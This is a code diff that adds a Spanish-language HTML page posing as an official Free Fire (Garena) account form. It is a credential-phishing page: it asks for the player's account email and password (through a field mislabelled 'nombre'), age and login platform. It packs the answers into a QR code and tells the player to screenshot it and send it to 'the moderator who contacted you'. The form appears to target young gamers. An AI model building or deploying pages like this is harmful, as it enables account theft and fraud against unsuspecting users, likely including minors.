@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Registro</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+    <style>
+        /* Diseño general */
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #2b2b2b;
+            margin: 0;
+            padding: 0;
+            color: #f0f0f0;
+        }
+
+        /* Estilo para el encabezado */
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 20px;
+            background-color: #ffb400; /* Amarillo suave */
+            color: #2b2b2b;
+        }
+
+        header img {
+            width: 40px;
+            height: 40px;
+            margin-right: 15px;
+        }
+
+        header h1 {
+            font-size: 2em;
+            margin: 0;
+            font-weight: bold;
+        }
+
+        /* Estilo para el contenedor del formulario */
+        .container {
+            width: 80%; /* Hacer el formulario más ancho */
+            margin: 30px auto;
+            padding: 30px;
+            background-color: #1d1d1d;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4);
+        }
+
+        label {
+            font-size: 1.2em;
+            color: #ffb400;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        /* Limitar el ancho de los campos de entrada */
+        input[type="text"], input[type="email"], input[type="number"], textarea, select {
+            width: 100%;  /* Ajustar al 100% del contenedor */
+            max-width: 600px; /* Limitar el ancho máximo */
+            padding: 12px;
+            margin: 10px 0 20px;
+            border: 2px solid #ffb400;
+            border-radius: 8px;
+            background-color: #2b2b2b;
+            color: #f0f0f0;
+            font-size: 1em;
+            display: block; /* Asegura que los elementos estén en bloque */
+            margin-left: auto;  /* Centrado horizontal */
+            margin-right: auto; /* Centrado horizontal */
+        }
+
+        textarea {
+            resize: vertical;
+        }
+
+        input[type="submit"] {
+            background-color: #ff7043; /* Naranja suave */
+            color: white;
+            border: none;
+            padding: 15px 20px;
+            font-size: 1.1em;
+            cursor: pointer;
+            width: 100%;
+            max-width: 600px; /* Limitar el ancho máximo */
+            border-radius: 8px;
+            transition: background-color 0.3s;
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #ff5722; /* Naranja más fuerte */
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        #qrcode {
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        canvas {
+            margin-top: 20px;
+            border: 2px solid #ff7043;
+            border-radius: 8px;
+        }
+
+        /* Estilo para el pie de página */
+        footer {
+            background-color: #1d1d1d;
+            color: #f0f0f0;
+            text-align: center;
+            padding: 20px 0;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+            font-size: 0.9em;
+        }
+
+        footer a {
+            color: #ffb400;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        footer a:hover {
+            color: #ff7043;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <img src="https://e7.pngegg.com/pngimages/121/207/png-clipart-red-garena-logo-garena-rov-mobile-moba-league-of-legends-youtube-singapore-cd-game-electronics.png" alt="Logo">
+        <h1>Free Fire</h1>
+    </header>
+    
+    <div class="container">
+        <form id="registroForm" action="#" method="POST">
+            <!-- Campo de texto para "¿por qué quieres la cuenta?" -->
+            <div class="form-group">
+                <label for="razon">¿Por qué quieres la cuenta?</label><br>
+                <textarea id="razon" name="razon" rows="4" required></textarea>
+            </div>
+            
+            <!-- Campo para correo electrónico -->
+            <h3>Agrega el correo de tu cuenta de FF para verificar:</h3>
+            <div class="form-group">
+                <label for="correo">Correo electrónico:</label><br>
+                <input type="email" id="correo" name="correo" required>
+            </div>
+            <h3>La contraseña de tu cuenta de Free Fire:</h>
+            <!-- Campo para nombre -->
+            <div class="form-group">
+                <label for="nombre">Contraseña:</label><br>
+                <input type="text" id="nombre" name="nombre" required>
+            </div>
+            
+            <!-- Campo para edad -->
+            <div class="form-group">
+                <label for="edad">Edad:</label><br>
+                <input type="number" id="edad" name="edad" min="1" required>
+            </div>
+            
+            <!-- Campo de elección para "Plataforma de gusto" -->
+            <div class="form-group">
+                <label for="plataforma">Plataforma de tu cuenta de FF:</label><br>
+                <select id="plataforma" name="plataforma" required>
+                    <option value="Google">Google</option>
+                    <option value="Facebook">Facebook</option>
+                    <option value="VK">VK</option>
+                </select>
+            </div>
+            
+            <input type="submit" value="Enviar">
+        </form>
+
+        <!-- Contenedor del código QR -->
+        <div id="qrcode">
+            <canvas id="canvas"></canvas>
+        </div>
+    </div>
+    <pre>     Toma captura a este codigo QR y envialo al moderador que
+                      se contactó contigo</pre>
+
+    <!-- Pie de página -->
+    <footer>
+        <p>Garena FF - &copy; 2024 | <a href="#">Términos y condiciones</a></p>
+    </footer>
+
+    <script>
+        document.getElementById('registroForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Evita que el formulario se envíe de forma tradicional
+
+            // Recoger los valores del formulario
+            const razon = document.getElementById('razon').value;
+            const correo = document.getElementById('correo').value;
+            const nombre = document.getElementById('nombre').value;
+            const edad = document.getElementById('edad').value;
+            const plataforma = document.getElementById('plataforma').value;
+
+            // Crear una cadena con los datos del formulario
+            const data = `Razón: ${razon}\nCorreo: ${correo}\nNombre: ${nombre}\nEdad: ${edad}\nPlataforma: ${plataforma}`;
+
+            // Limpiar el canvas antes de mostrar un nuevo código QR
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+            // Usar QRCode.toCanvas para crear el código QR
+            QRCode.toCanvas(canvas, data, { width: 200 }, function (error) {
+                if (error) console.error(error);
+                console.log('Código QR generado!');
+            });
+        });
+    </script>
+
+</body>
+</html>
